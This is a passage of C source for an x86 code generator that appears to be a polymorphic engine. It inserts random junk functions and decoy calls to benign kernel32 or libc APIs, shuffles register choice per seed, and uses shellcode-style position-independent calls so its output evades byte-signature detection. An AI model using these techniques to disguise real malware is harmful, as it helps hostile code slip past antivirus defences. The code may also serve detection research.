    int* glob_fixup_offsets;  // Position in code to patch
    int* glob_fixup_indices;  // Global index being referenced
    int* glob_fixup_bases;    // Base offset (position of instruction after call/pop)
    int glob_fixup_count;
    int glob_fixup_cap;
    // Absolute-mode fixups (deferred until PE/ELF layout is known)
    int* abs_data_fixup_offsets;   // Position in code to patch (4-byte placeholder)
    int* abs_data_fixup_data_offs; // Offset within data section being referenced
    int abs_data_fixup_count;
    int abs_data_fixup_cap;
    int* abs_extern_fixup_offsets; // Position in code to patch
    int* abs_extern_fixup_slots;   // API slot index being called
    int abs_extern_fixup_count;
    int abs_extern_fixup_cap;
    // Register allocator state
    int ra_alloc[8];         // alloc[reg] = temp in this register (-1=free, -2=scratch)
    int* ra_temp_reg;        // [temp_count]: register holding each temp (-1=on stack)
    int* ra_dirty;           // [temp_count]: 1=register value newer than stack copy
    int ra_reg_order[8];     // PRNG-shuffled register preference (up to 6 used)
    int ra_num_regs;         // 5 (PIC mode) or 6 (non-PIC)
    int* ra_last_use;        // [temp_count]: per-block last-use instr index (-1=not used)
    int ra_cur_instr;        // current instruction index within block
    int* ra_temp_last_block; // [temp_count]: last block index where temp is referenced
    int ra_cur_block;        // current block index
    // Call fixups (for function reordering)
    int* call_fixup_offsets;
    int* call_fixup_targets;
    int call_fixup_count;
    int call_fixup_cap;
    // Func addr fixups (for OP_FUNC_ADDR)
    int* faddr_fixup_offsets;
    int* faddr_fixup_targets;
    int faddr_fixup_count;
    int faddr_fixup_cap;
    // Junk function data
    int* junk_func_offsets;
    int junk_func_count;
    int* junk_call_fixup_offsets;
    int* junk_call_fixup_targets;
    int junk_call_fixup_count;
    int junk_call_fixup_cap;
    // Harmless API call data (injected externs)
    int* harmless_api_indices;
    int  harmless_api_count;
    // Calling convention for external functions
    int cdecl_externs;  // 1 = cdecl (Linux/libc): caller cleans all args; 0 = stdcall (Windows)
};


void codegen_init(struct CodeGen* cg, struct Module* mod, struct Prng* prng, int pic_mode, int abs_mode, struct X86Config x86) {
    cg->mod = mod;
    cg->prng = prng;
    cg->code = buf_new(4096);
    cg->data = buf_new(1024);
    cg->func_offsets = (int*)malloc(sizeof(int) * mod->func_count);
    cg->block_offsets = NULL;
    cg->temp_spill = NULL;
    cg->stack_size = 0;
    cg->pic_mode = pic_mode;
    cg->abs_mode = abs_mode;
    cg->x86 = x86;
    cg->api_slot_offset = 0;
    cg->entry_func_idx = mod->entry_func;
    cg->fixup_offsets = NULL;
    cg->fixup_targets = NULL;
    cg->fixup_sizes = NULL;
    cg->fixup_count = 0;
    cg->fixup_cap = 0;
    cg->current_func = NULL;
    cg->string_offsets = (int*)malloc(sizeof(int) * (mod->string_count + 1));
    cg->global_offsets = (int*)malloc(sizeof(int) * (mod->global_count + 1));
    cg->str_fixup_offsets = NULL;
    cg->str_fixup_indices = NULL;
    cg->str_fixup_bases = NULL;
    cg->str_fixup_count = 0;
    cg->str_fixup_cap = 0;
    cg->glob_fixup_offsets = NULL;
    cg->glob_fixup_indices = NULL;
    cg->glob_fixup_bases = NULL;
    cg->glob_fixup_count = 0;
    cg->glob_fixup_cap = 0;
    cg->abs_data_fixup_offsets = NULL;
    cg->abs_data_fixup_data_offs = NULL;
    cg->abs_data_fixup_count = 0;
    cg->abs_data_fixup_cap = 0;
    cg->abs_extern_fixup_offsets = NULL;
    cg->abs_extern_fixup_slots = NULL;
    cg->abs_extern_fixup_count = 0;
    cg->abs_extern_fixup_cap = 0;
    cg->call_fixup_offsets = NULL;
    cg->call_fixup_targets = NULL;
    cg->call_fixup_count = 0;
    cg->call_fixup_cap = 0;
    cg->faddr_fixup_offsets = NULL;
    cg->faddr_fixup_targets = NULL;
    cg->faddr_fixup_count = 0;
    cg->faddr_fixup_cap = 0;
    cg->junk_func_offsets = NULL;
    cg->junk_func_count = 0;
    cg->junk_call_fixup_offsets = NULL;
    cg->junk_call_fixup_targets = NULL;
    cg->junk_call_fixup_count = 0;
    cg->junk_call_fixup_cap = 0;
    cg->harmless_api_indices = NULL;
    cg->harmless_api_count = 0;
    // Register allocator init
    for (int ri = 0; ri < 8; ri++) cg->ra_alloc[ri] = -1;
    cg->ra_temp_reg = NULL;
    cg->ra_dirty = NULL;
    cg->ra_last_use = NULL;
    cg->ra_num_regs = 0;
    cg->ra_cur_instr = 0;
    cg->ra_temp_last_block = NULL;
    cg->ra_cur_block = 0;
    // Auto-detect calling convention: "libc.so.6" externs => cdecl (caller cleans all args)
    cg->cdecl_externs = 0;
    {
        for (int i = 0; i < mod->func_count; i++) {
            if (mod->funcs[i].block_count == 0 && mod->funcs[i].dll_name) {
                char* dn = mod->funcs[i].dll_name;
                // Compare with "libc.so." prefix (covers libc.so.6, libc.so.5, etc.)
                if (dn[0]=='l' && dn[1]=='i' && dn[2]=='b' && dn[3]=='c' &&
                    dn[4]=='.' && dn[5]=='s' && dn[6]=='o' && dn[7]=='.') {
                    cg->cdecl_externs = 1;
                    break;
                }
            }
        }
    }
}

void add_fixup(struct CodeGen* cg, int code_offset, int target_block, int instr_size) {
    if (cg->fixup_count >= cg->fixup_cap) {
        cg->fixup_cap = cg->fixup_cap ? cg->fixup_cap * 2 : 32;
        cg->fixup_offsets = (int*)realloc(cg->fixup_offsets, sizeof(int) * cg->fixup_cap);
        cg->fixup_targets = (int*)realloc(cg->fixup_targets, sizeof(int) * cg->fixup_cap);
        cg->fixup_sizes = (int*)realloc(cg->fixup_sizes, sizeof(int) * cg->fixup_cap);
    }
    cg->fixup_offsets[cg->fixup_count] = code_offset;
    cg->fixup_targets[cg->fixup_count] = target_block;
    cg->fixup_sizes[cg->fixup_count] = instr_size;
    cg->fixup_count++;
}

void add_call_fixup(struct CodeGen* cg, int offset, int func_idx) {
    if (cg->call_fixup_count >= cg->call_fixup_cap) {
        cg->call_fixup_cap = cg->call_fixup_cap ? cg->call_fixup_cap * 2 : 64;
        cg->call_fixup_offsets = (int*)realloc(cg->call_fixup_offsets, sizeof(int) * cg->call_fixup_cap);
        cg->call_fixup_targets = (int*)realloc(cg->call_fixup_targets, sizeof(int) * cg->call_fixup_cap);
    }
    cg->call_fixup_offsets[cg->call_fixup_count] = offset;
    cg->call_fixup_targets[cg->call_fixup_count] = func_idx;
    cg->call_fixup_count++;
}

void add_faddr_fixup(struct CodeGen* cg, int offset, int func_idx) {
    if (cg->faddr_fixup_count >= cg->faddr_fixup_cap) {
        cg->faddr_fixup_cap = cg->faddr_fixup_cap ? cg->faddr_fixup_cap * 2 : 16;
        cg->faddr_fixup_offsets = (int*)realloc(cg->faddr_fixup_offsets, sizeof(int) * cg->faddr_fixup_cap);
        cg->faddr_fixup_targets = (int*)realloc(cg->faddr_fixup_targets, sizeof(int) * cg->faddr_fixup_cap);
    }
    cg->faddr_fixup_offsets[cg->faddr_fixup_count] = offset;
    cg->faddr_fixup_targets[cg->faddr_fixup_count] = func_idx;
    cg->faddr_fixup_count++;
}

void add_junk_call_fixup(struct CodeGen* cg, int offset, int junk_idx) {
    if (cg->junk_call_fixup_count >= cg->junk_call_fixup_cap) {
        cg->junk_call_fixup_cap = cg->junk_call_fixup_cap ? cg->junk_call_fixup_cap * 2 : 64;
        cg->junk_call_fixup_offsets = (int*)realloc(cg->junk_call_fixup_offsets, sizeof(int) * cg->junk_call_fixup_cap);
        cg->junk_call_fixup_targets = (int*)realloc(cg->junk_call_fixup_targets, sizeof(int) * cg->junk_call_fixup_cap);
    }
    cg->junk_call_fixup_offsets[cg->junk_call_fixup_count] = offset;
    cg->junk_call_fixup_targets[cg->junk_call_fixup_count] = junk_idx;
    cg->junk_call_fixup_count++;
}

static void emit_harmless_api_call(struct CodeGen* cg, int func_idx);  // forward decl

// Generate one complete junk x86 function
void gen_junk_function(struct CodeGen* cg, int junk_idx) {
    struct Buffer* code = cg->code;
    cg->junk_func_offsets[junk_idx] = code->len;

    { char _n[32]; snprintf(_n, sizeof(_n), "junk_%d", junk_idx); annot_begin_func(_n, "junk_function", code->len); }

    // Prologue
    emit_push(code, REG_EBP);
    emit_mov_rr(code, REG_EBP, REG_ESP);
    emit_sub_ri(code, REG_ESP, 16);
    emit_push(code, REG_EBX);
    emit_push(code, REG_ESI);
    emit_push(code, REG_EDI);

    // 5-15 random instructions, with a synthetic harmless call in the middle
    int instr_count = prng_range(cg->prng, 11) + 5;
    int mid = instr_count / 2;
    for (int j = 0; j < instr_count; j++) {
        if (j == mid && cg->x86.harmless_calls && cg->harmless_api_count > 0) {
            int idx = prng_range(cg->prng, cg->harmless_api_count);
            emit_harmless_api_call(cg, cg->harmless_api_indices[idx]);
        }
        int choice = prng_range(cg->prng, 8);
        int reg = prng_range(cg->prng, 3);  // EAX, ECX, EDX only
        int reg2 = prng_range(cg->prng, 3);
        int imm = prng_range(cg->prng, 65536);
        int slot = (prng_range(cg->prng, 4) + 1) * 4;

        switch (choice) {
            case 0: emit_mov_ri(code, reg, imm); break;
            case 1: emit_add_rr(code, reg, reg2); break;
            case 2: emit_xor_ri(code, reg, imm); break;
            case 3: emit_mov_mr_disp(code, REG_EBP, -slot, reg); break;
            case 4: emit_mov_rm_disp(code, reg, REG_EBP, -slot); break;
            case 5: emit_cmp_ri(code, reg, imm); break;
            case 6: emit_imul_rr(code, reg, reg2); break;
            default: emit_sub_ri(code, reg, imm); break;
        }
    }

    // Return a "result"
    emit_mov_ri(code, REG_EAX, prng_range(cg->prng, 65536));

    // Epilogue
    emit_pop(code, REG_EDI);
    emit_pop(code, REG_ESI);
    emit_pop(code, REG_EBX);
    emit_mov_rr(code, REG_ESP, REG_EBP);
    emit_pop(code, REG_EBP);
    emit_ret(code);

    annot_end_func(code->len);
}

// Maybe emit a call to a junk function
void maybe_emit_junk_call(struct CodeGen* cg, int probability) {
    if (!cg->x86.junk_funcs) return;
    if (cg->junk_func_count <= 0) return;
    if (prng_range(cg->prng, 100) >= probability) return;

    struct Buffer* code = cg->code;
    int junk_idx = prng_range(cg->prng, cg->junk_func_count);
    int arg_count = prng_range(cg->prng, 4);  // 0-3 args

    // Push random immediate arguments
    for (int a = 0; a < arg_count; a++) {
        emit_push_i(code, prng_range(cg->prng, 65536));
    }

    // CALL rel32 placeholder
    emit_byte(code, 0xE8);
    add_junk_call_fixup(cg, code->len, junk_idx);
    emit_byte(code, 0);
    emit_byte(code, 0);
    emit_byte(code, 0);
    emit_byte(code, 0);

    // Caller cleanup
    if (arg_count > 0) {
        emit_add_ri(code, REG_ESP, arg_count * 4);
    }
}

// Forward declarations for absolute-mode fixup helpers (defined after load_operand)
void add_abs_data_fixup(struct CodeGen* cg, int code_offset, int data_section_offset);
void add_abs_extern_fixup(struct CodeGen* cg, int code_offset, int api_slot);

// Emit one junk pattern inside a hand-managed stack frame. Coin-flips per
// gap so insertion is sparse (not at every safe gap), keeping the call
// reasonably compact while still breaking up the fixed byte template.
// Skips pattern 3 (PUSH/MOV/POP) which would disrupt manual ESP tracking,
// and masks busy regs out of pick_free_reg's pool so the junk does not
// clobber the live EBX/EAX values in the PIC sequence.
static void emit_harmless_junk(struct CodeGen* cg, int busy_reg_mask) {
    // ~50% per gap. PRNG-driven so it varies per call site and per seed.
    if (prng_range(cg->prng, 2) == 0) return;

    // pick_free_reg consults g_junk_ra_alloc / g_junk_ra_reg_order. Those globals
    // are only set transiently around the inter-instruction junk window, so when
    // emit_harmless_api_call runs they are typically NULL — in which case
    // pick_free_reg falls back to a fixed pool that includes EAX, clobbering
    // our live values. Always present a busy-aware RA view here.
    // Junk inside the harmless-call template MUST only use the 4 registers the
    // template itself saves/restores: EBX, EAX, ECX, EDX. Touching ESI/EDI
    // would clobber whichever RA temp the caller has parked there, since the
    // template doesn't save those regs.
    int local_alloc[8];
    int default_order[4];
    default_order[0] = REG_EBX; default_order[1] = REG_EAX;
    default_order[2] = REG_ECX; default_order[3] = REG_EDX;

    int* saved_alloc = g_junk_ra_alloc;
    int saved_num = g_junk_ra_num_regs;
    int* saved_order = g_junk_ra_reg_order;

    if (saved_alloc) {
        // Real RA published (inter-instr junk window). Take the existing view
        // and additionally mask ESI/EDI plus our busy bits.
        for (int r = 0; r < 8; r++) local_alloc[r] = saved_alloc[r];
        for (int r = 0; r < 8; r++) {
            if (busy_reg_mask & (1 << r)) saved_alloc[r] = 999;
        }
        saved_alloc[REG_ESI] = 999;
        saved_alloc[REG_EDI] = 999;
    } else {
        // Synthesize: 4-reg pool, all free except busy.
        for (int r = 0; r < 8; r++) local_alloc[r] = (busy_reg_mask & (1 << r)) ? 999 : -1;
        g_junk_ra_alloc = local_alloc;
        g_junk_ra_num_regs = 4;
        g_junk_ra_reg_order = default_order;
    }

    int pattern = 0;
    for (int spin = 0; spin < 16; spin++) {
        pattern = genome_pick(get_genome()->junk_seq_weights, 8, cg->prng);
        if (pattern != 3) break;
    }
    if (pattern == 3) pattern = 0;  // fallback if genome heavily favors 3

    emit_junk_pattern(cg->code, cg->prng, pattern);

    if (saved_alloc) {
        for (int r = 0; r < 8; r++) saved_alloc[r] = local_alloc[r];
    } else {
        g_junk_ra_alloc = NULL;
        g_junk_ra_num_regs = saved_num;
        g_junk_ra_reg_order = saved_order;
    }
}

// Emit a call to a harmless 0-param extern API via PIC API table.
// Uses CALL/POP/SUB to compute exec_base, then indirect call through the table.
// Saves/restores EBX, EAX, ECX, EDX so that live register-allocator temps
// are not clobbered: EBX is explicitly set by CALL+POP+SUB; EAX/ECX/EDX
// are trashed by the cdecl callee.  ESI/EDI are callee-saved by the API.
static void emit_harmless_api_call(struct CodeGen* cg, int func_idx) {
    struct Buffer* code = cg->code;
    if (cg->abs_mode == 1) {
        // Abs PE mode: save volatile regs, CALL [IAT] (FF 15), restore
        emit_push(code, REG_EAX);
        emit_push(code, REG_ECX);
        emit_push(code, REG_EDX);
        emit_byte(code, 0xFF);  // CALL [disp32]
        emit_byte(code, 0x15);
        add_abs_extern_fixup(cg, code->len, func_idx);
        emit_u32(code, 0);
        emit_pop(code, REG_EDX);
        emit_pop(code, REG_ECX);
        emit_pop(code, REG_EAX);
        return;
    }
    if (cg->abs_mode == 2) {
        // Abs ELF mode: save volatile regs, CALL rel32 to wrapper, restore
        emit_push(code, REG_EAX);
        emit_push(code, REG_ECX);
        emit_push(code, REG_EDX);
        emit_byte(code, 0xE8);  // CALL rel32
        add_abs_extern_fixup(cg, code->len, func_idx);
        emit_u32(code, 0);
        emit_pop(code, REG_EDX);
        emit_pop(code, REG_ECX);
        emit_pop(code, REG_EAX);
        return;
    }
    // PIC mode: Save registers that the sequence or the callee will clobber.
    // Junk is interspersed at every safe gap (~50% probability per gap, PRNG-driven)
    // to break up the fixed byte template that would otherwise match across seeds.
    //
    // Each gap's busy_reg_mask preserves regs that hold values the immediately
    // following real instruction needs:
    //  - Before all 4 PUSHes complete: caller's unpushed regs are still live.
    //  - After POP EBX: EBX holds the return address; SUB reads EBX as its lhs.
    //  - After SUB: EBX holds exec_base; subsequent MOVs read it.
    //  - Between the two MOVs: EAX holds intermediate &api[].
    //  - After the second MOV: EAX holds fn_ptr; CALL reads it.
    //  - After CALL: caller-saved regs are clobbered by the API; nothing to preserve.
    //  - After each restore POP: that reg now holds the caller's saved value.
    int mEAX = 1 << REG_EAX;
    int mECX = 1 << REG_ECX;
    int mEDX = 1 << REG_EDX;
    int mEBX = 1 << REG_EBX;

    emit_push(code, REG_EBX);
    emit_harmless_junk(cg, mEAX | mECX | mEDX);          // EAX/ECX/EDX still hold caller's values
    emit_push(code, REG_EAX);
    emit_harmless_junk(cg, mECX | mEDX);
    emit_push(code, REG_ECX);
    emit_harmless_junk(cg, mEDX);
    emit_push(code, REG_EDX);
    emit_harmless_junk(cg, 0);                           // all 4 saved
    int current_pos = code->len;
    emit_byte(code, 0xE8);
    emit_u32(code, 0);
    emit_harmless_junk(cg, 0);                           // CALL+0 pushed return; pattern 3 excluded so stack stays balanced
    emit_pop(code, REG_EBX);
    emit_harmless_junk(cg, mEBX);                        // EBX = return_addr, SUB reads it
    emit_sub_ri(code, REG_EBX, current_pos + 5);         // EBX = exec_base
    emit_harmless_junk(cg, mEBX);                        // EBX live across next MOV
    emit_mov_rm_disp(code, REG_EAX, REG_EBX, cg->api_slot_offset);  // EAX = &api[]
    emit_harmless_junk(cg, mEBX | mEAX);                 // both live across next MOV
    emit_mov_rm_disp(code, REG_EAX, REG_EAX, func_idx * 4);         // EAX = fn ptr
    emit_harmless_junk(cg, mEAX);                        // EAX live, EBX dead now
    emit_byte(code, 0xFF); emit_byte(code, 0xD0);        // CALL EAX (direct -- no push/reload dance)
    emit_harmless_junk(cg, 0);                           // callee trashed EAX/ECX/EDX/EBX
    // Restore saved registers (reverse order). After each POP, that register
    // holds the caller's saved value -- subsequent junk must not modify it.
    emit_pop(code, REG_EDX);
    emit_harmless_junk(cg, mEDX);
    emit_pop(code, REG_ECX);
    emit_harmless_junk(cg, mEDX | mECX);
    emit_pop(code, REG_EAX);
    emit_harmless_junk(cg, mEDX | mECX | mEAX);
    emit_pop(code, REG_EBX);
}

// Find harmless 0-param extern APIs by matching dll_name against platform.
// Any 0-param extern from kernel32.dll (Win32) or libc.so.6 (Linux) is
// automatically treated as harmless — no per-name whitelist needed.
static int is_harmless_extern(struct Function* f, int cdecl_externs) {
    if (f->param_count != 0 || !f->dll_name) return 0;
    if (cdecl_externs && strcmp(f->dll_name, "libc.so.6") == 0) return 1;
    if (!cdecl_externs && strcmp(f->dll_name, "kernel32.dll") == 0) return 1;
    return 0;
}

void find_harmless_apis(struct CodeGen* cg) {
    // Pass 1: count harmless 0-param externs (can be at any index after shuffling)
    int count = 0;
    for (int i = 0; i < cg->mod->func_count; i++) {
        struct Function* f = &cg->mod->funcs[i];
        if (f->block_count == 0 && is_harmless_extern(f, cg->cdecl_externs))
            count++;
    }

    cg->harmless_api_count = 0;
    cg->harmless_api_indices = (int*)malloc(sizeof(int) * (count > 0 ? count : 1));
    if (count == 0) return;

    // Pass 2: fill with api_slot values (stable slots resolved by name)
    for (int i = 0; i < cg->mod->func_count; i++) {
        struct Function* f = &cg->mod->funcs[i];
        if (f->block_count == 0 && is_harmless_extern(f, cg->cdecl_externs))
            cg->harmless_api_indices[cg->harmless_api_count++] = f->api_slot;
    }
}

void maybe_emit_harmless_api_call(struct CodeGen* cg, int probability) {
    if (!cg->x86.harmless_calls) return;
    if (cg->harmless_api_count <= 0) return;
    if (prng_range(cg->prng, 100) >= probability) return;
    int idx = prng_range(cg->prng, cg->harmless_api_count);
    emit_harmless_api_call(cg, cg->harmless_api_indices[idx]);
}

// =============================================================================
// Register Allocator
// =============================================================================

// Forward declarations for functions used by the register allocator
void load_operand(struct CodeGen* cg, struct Operand* op, int dst_reg);

// RA-aware free register picker: returns -1 if no free register available
int pick_free_reg_cg(struct CodeGen* cg) {
    if (cg && cg->ra_temp_reg) {
        int free_regs[8];
        int nfree = 0;
        for (int i = 0; i < cg->ra_num_regs; i++) {
            int r = cg->ra_reg_order[i];
            if (cg->ra_alloc[r] < 0) free_regs[nfree++] = r;
        }
        if (nfree == 0) return -1;
        return free_regs[prng_range(cg->prng, nfree)];
    }
    // No allocator active
    int free_regs[] = {REG_EAX, REG_ECX, REG_EDX, REG_ESI, REG_EDI};
    return free_regs[prng_range(cg->prng, 5)];
}

void ra_init_func(struct CodeGen* cg, struct Function* func) {
    int tc = func->temp_count;
    if (tc < 1) tc = 1;

    cg->ra_temp_reg = (int*)realloc(cg->ra_temp_reg, sizeof(int) * tc);
    cg->ra_dirty = (int*)realloc(cg->ra_dirty, sizeof(int) * tc);
    cg->ra_last_use = (int*)realloc(cg->ra_last_use, sizeof(int) * tc);

    for (int i = 0; i < tc; i++) {
        cg->ra_temp_reg[i] = -1;
        cg->ra_dirty[i] = 0;
    }
    for (int i = 0; i < 8; i++) cg->ra_alloc[i] = -1;

    // Build allocatable register list (exclude ESP, EBP; exclude EBX in PIC mode)
    if (cg->pic_mode) {
        cg->ra_num_regs = 5;
        cg->ra_reg_order[0] = REG_EAX;
        cg->ra_reg_order[1] = REG_ECX;
        cg->ra_reg_order[2] = REG_EDX;
        cg->ra_reg_order[3] = REG_ESI;
        cg->ra_reg_order[4] = REG_EDI;
    } else {
        cg->ra_num_regs = 6;
        cg->ra_reg_order[0] = REG_EAX;
        cg->ra_reg_order[1] = REG_ECX;
        cg->ra_reg_order[2] = REG_EDX;
        cg->ra_reg_order[3] = REG_EBX;
        cg->ra_reg_order[4] = REG_ESI;
        cg->ra_reg_order[5] = REG_EDI;
    }

    // Compute last block where each temp is referenced (for dead-temp spill elimination)
    cg->ra_temp_last_block = (int*)realloc(cg->ra_temp_last_block, sizeof(int) * tc);
    for (int i = 0; i < tc; i++) cg->ra_temp_last_block[i] = -1;
    for (int b = 0; b < func->block_count; b++) {
        struct Block* blk = &func->blocks[b];
        for (int i = 0; i < blk->instr_count; i++) {
            struct Instruction* ins = &blk->instrs[i];
            if (ins->src1.kind == VK_TEMP) cg->ra_temp_last_block[ins->src1.index] = b;
            if (ins->src2.kind == VK_TEMP) cg->ra_temp_last_block[ins->src2.index] = b;
            if (ins->dest.kind == VK_TEMP) cg->ra_temp_last_block[ins->dest.index] = b;
            if ((ins->opcode == 96 || ins->opcode == 97 ||
                 ins->opcode == 100 || ins->opcode == 101 ||
                 ins->opcode == 103) && ins->args) {
                for (int a = 0; a < ins->arg_count; a++) {
                    if (ins->args[a].kind == VK_TEMP) cg->ra_temp_last_block[ins->args[a].index] = b;
                }
            }
        }
    }
    cg->ra_cur_block = 0;

    // Shuffle register preference order for polymorphism. Unconditional --
    // RA shuffle is orthogonal to instruction-pattern polymorphism, and
    // gating it behind poly_instrs makes "no transforms" produce
    // bit-identical output across seeds.
    for (int i = cg->ra_num_regs - 1; i > 0; i--) {
        int j = prng_range(cg->prng, i + 1);
        int tmp = cg->ra_reg_order[i];
        cg->ra_reg_order[i] = cg->ra_reg_order[j];
        cg->ra_reg_order[j] = tmp;
    }
}

void ra_free_func(struct CodeGen* cg) {
    free(cg->ra_temp_reg); cg->ra_temp_reg = NULL;
    free(cg->ra_dirty); cg->ra_dirty = NULL;
    free(cg->ra_last_use); cg->ra_last_use = NULL;
    free(cg->ra_temp_last_block); cg->ra_temp_last_block = NULL;
}

void ra_begin_block(struct CodeGen* cg, struct Block* blk) {
    int tc = cg->current_func->temp_count;
    if (tc < 1) tc = 1;

    for (int i = 0; i < 8; i++) cg->ra_alloc[i] = -1;
    for (int i = 0; i < tc; i++) cg->ra_temp_reg[i] = -1;

    // Compute last-use instruction index for each temp in this block
    for (int i = 0; i < tc; i++) cg->ra_last_use[i] = -1;
    for (int i = blk->instr_count - 1; i >= 0; i--) {
        struct Instruction* ins = &blk->instrs[i];
        if (ins->src1.kind == VK_TEMP && cg->ra_last_use[ins->src1.index] < 0)
            cg->ra_last_use[ins->src1.index] = i;
        if (ins->src2.kind == VK_TEMP && cg->ra_last_use[ins->src2.index] < 0)
            cg->ra_last_use[ins->src2.index] = i;
        // STORE dest is a read (pointer dereference)
        if (ins->opcode == 65 && ins->dest.kind == VK_TEMP && cg->ra_last_use[ins->dest.index] < 0)
            cg->ra_last_use[ins->dest.index] = i;
        // CALL/CALLV/ICALL/ICALLV/SYSCALL args
        if ((ins->opcode == 96 || ins->opcode == 97 ||
             ins->opcode == 100 || ins->opcode == 101 ||
             ins->opcode == 103) && ins->args) {
            for (int a = 0; a < ins->arg_count; a++) {
                if (ins->args[a].kind == VK_TEMP && cg->ra_last_use[ins->args[a].index] < 0)
                    cg->ra_last_use[ins->args[a].index] = i;
            }
        }
    }
}

void ra_spill_reg(struct CodeGen* cg, int reg) {
    int temp = cg->ra_alloc[reg];
    if (temp < 0) return;
    if (cg->ra_dirty[temp]) {
        int offset = -(4 + temp * 4);  // same as get_temp_offset
        emit_mov_mr_disp(cg->code, REG_EBP, offset, reg);
        cg->ra_dirty[temp] = 0;
    }
    cg->ra_temp_reg[temp] = -1;
    cg->ra_alloc[reg] = -1;
}

void ra_spill_all(struct CodeGen* cg) {
    for (int r = 0; r < 8; r++) {
        if (cg->ra_alloc[r] >= 0) ra_spill_reg(cg, r);
        cg->ra_alloc[r] = -1;  // also clear scratch markers
    }
}

// Find a truly free register (returns -1 if none)
// Only returns registers with alloc == -1 (truly free, not scratch -2 in use)
int ra_find_free(struct CodeGen* cg) {
    for (int i = 0; i < cg->ra_num_regs; i++) {
        int r = cg->ra_reg_order[i];
        if (cg->ra_alloc[r] == -1) return r;
    }
    return -1;
}

// Pick a register to spill, avoiding exclude1/exclude2/exclude3 (-1 to ignore)
// Prefers: free regs > temps not used again in block > temps used furthest in future
int ra_pick_victim(struct CodeGen* cg, int ex1, int ex2, int ex3) {
    int best = -1;
    int best_score = -1;
    for (int i = 0; i < cg->ra_num_regs; i++) {
        int r = cg->ra_reg_order[i];
        if (r == ex1 || r == ex2 || r == ex3) continue;
        if (cg->ra_alloc[r] == -2) continue;  // scratch in use
        if (cg->ra_alloc[r] < 0) return r;    // free register
        int t = cg->ra_alloc[r];
        int lu = cg->ra_last_use[t];
        if (lu < 0) return r;  // not used again in this block — ideal victim
        // Prefer spilling temps used furthest in the future
        if (lu > best_score) { best_score = lu; best = r; }
    }
    if (best >= 0) return best;
    // Fallback: first non-excluded allocatable register
    for (int i = 0; i < cg->ra_num_regs; i++) {
        int r = cg->ra_reg_order[i];
        if (r == ex1 || r == ex2 || r == ex3) continue;
        return r;
    }
    return cg->ra_reg_order[0];  // should never reach here
}

// Ensure a temp is in a register, return its register
int ra_ensure(struct CodeGen* cg, int temp) {
    int reg = cg->ra_temp_reg[temp];
    if (reg >= 0) return reg;
    // Not in a register — load from stack
    reg = ra_find_free(cg);
    if (reg < 0) {
        reg = ra_pick_victim(cg, -1, -1, -1);
        ra_spill_reg(cg, reg);
    }
    int offset = -(4 + temp * 4);
    emit_mov_rm_disp(cg->code, reg, REG_EBP, offset);
    cg->ra_alloc[reg] = temp;
    cg->ra_temp_reg[temp] = reg;
    cg->ra_dirty[temp] = 0;  // stack copy is current
    return reg;
}

// Like ra_ensure but excludes a specific register from allocation.
// Used when a scratch register holds a value we need to preserve.
int ra_ensure_ex(struct CodeGen* cg, int temp, int exclude) {
    int reg = cg->ra_temp_reg[temp];
    if (reg >= 0) return reg;
    // Not in a register — load from stack, avoiding 'exclude'
    reg = -1;
    for (int i = 0; i < cg->ra_num_regs; i++) {
        int r = cg->ra_reg_order[i];
        if (r == exclude) continue;
        if (cg->ra_alloc[r] == -1) { reg = r; break; }
    }
    if (reg < 0) {
        reg = ra_pick_victim(cg, exclude, -1, -1);
        ra_spill_reg(cg, reg);
    }
    int offset = -(4 + temp * 4);
    emit_mov_rm_disp(cg->code, reg, REG_EBP, offset);
    cg->ra_alloc[reg] = temp;
    cg->ra_temp_reg[temp] = reg;
    cg->ra_dirty[temp] = 0;
    return reg;
}

// Allocate a register for a newly defined temp.
// exclude1/exclude2: registers to avoid spilling (-1 to ignore)
int ra_def(struct CodeGen* cg, int temp, int ex1, int ex2) {
    if (cg->ra_temp_reg[temp] >= 0) {
        // Temp already in a register (e.g., dest == src same temp): reuse
        cg->ra_dirty[temp] = 1;
        return cg->ra_temp_reg[temp];
    }
    int reg = ra_find_free(cg);
    if (reg < 0) {
        reg = ra_pick_victim(cg, ex1, ex2, -1);
        ra_spill_reg(cg, reg);
    }
    cg->ra_alloc[reg] = temp;
    cg->ra_temp_reg[temp] = reg;
    cg->ra_dirty[temp] = 1;
    return reg;
}

// Like ra_def, but tries to reuse 'hint' register if its occupant is dying.
int ra_def_reuse(struct CodeGen* cg, int temp, int hint, int ex1) {
    if (cg->ra_temp_reg[temp] >= 0) {
        cg->ra_dirty[temp] = 1;
        return cg->ra_temp_reg[temp];
    }
    if (hint >= 0 && hint != ex1) {
        int ht = cg->ra_alloc[hint];
        if (ht >= 0 && ht != temp && cg->ra_last_use[ht] == cg->ra_cur_instr) {
            if (cg->ra_dirty[ht] && cg->ra_temp_last_block[ht] > cg->ra_cur_block) {
                int offset = -(4 + ht * 4);
                emit_mov_mr_disp(cg->code, REG_EBP, offset, hint);
            }
            cg->ra_temp_reg[ht] = -1;
            cg->ra_dirty[ht] = 0;
            cg->ra_alloc[hint] = temp;
            cg->ra_temp_reg[temp] = hint;
            cg->ra_dirty[temp] = 1;
            return hint;
        }
    }
    return ra_def(cg, temp, hint, ex1);
}

// Force a temp (or a scratch load) into a specific register
void ra_force(struct CodeGen* cg, int temp, int wanted) {
    int cur = cg->ra_temp_reg[temp];
    if (cur == wanted) return;  // already there

    // If wanted reg is occupied by another temp, displace it
    int occ = cg->ra_alloc[wanted];
    if (occ >= 0 && occ != temp) {
        // Find a truly free register (== -1) — don't clobber scratch values
        int alt = -1;
        for (int i = 0; i < cg->ra_num_regs; i++) {
            int r = cg->ra_reg_order[i];
            if (cg->ra_alloc[r] == -1) { alt = r; break; }
        }
        if (alt >= 0) {
            emit_mov_rr(cg->code, alt, wanted);
            cg->ra_alloc[alt] = occ;
            cg->ra_temp_reg[occ] = alt;
        } else {
            ra_spill_reg(cg, wanted);
        }
    } else if (occ == -2) {
        cg->ra_alloc[wanted] = -1;  // clear scratch marker
    }

    if (cur >= 0) {
        // Temp is in another register — move it
        emit_mov_rr(cg->code, wanted, cur);
        cg->ra_alloc[cur] = -1;
    } else {
        // Temp is on stack — load it
        int offset = -(4 + temp * 4);
        emit_mov_rm_disp(cg->code, wanted, REG_EBP, offset);
        cg->ra_dirty[temp] = 0;
    }
    cg->ra_alloc[wanted] = temp;
    cg->ra_temp_reg[temp] = wanted;
}

// Load an operand into a register, return the register.
// For VK_TEMP: uses the allocator. For others: allocates a scratch register.
int ra_load_src(struct CodeGen* cg, struct Operand* op) {
    if (op->kind == VK_TEMP) {
        return ra_ensure(cg, op->index);
    }
    // Non-temp: allocate a scratch register and load into it
